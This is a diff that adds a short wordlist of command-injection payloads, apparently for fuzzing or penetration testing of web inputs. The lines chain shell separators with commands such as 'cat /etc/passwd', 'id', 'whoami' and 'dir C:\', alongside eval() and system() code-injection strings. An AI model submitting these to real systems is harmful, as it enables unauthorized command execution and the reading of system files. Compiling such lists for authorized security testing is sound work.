@@ -1,0 +1,17 @@
+aaaa || cat /etc/passwd
+cat /etc/passwd
+aaaa%20||%20cat%20/etc/passwd
+;id;
+;id
+| dir
+; dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+eval('ls')
+eval('whoami')
+eval('whoami');
+system('ls')
+system('pwd');
+darkshadow'.system('id').'
